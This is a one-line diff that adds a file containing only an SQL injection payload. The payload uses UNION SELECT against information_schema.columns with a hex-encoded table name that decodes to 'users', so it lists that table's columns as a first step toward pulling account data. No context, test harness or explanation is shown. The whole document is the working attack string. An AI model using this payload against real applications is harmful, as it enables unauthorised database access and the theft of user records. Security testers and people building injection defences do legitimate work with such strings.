@@ -1,0 +1,1 @@
+5 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x7573657273 --
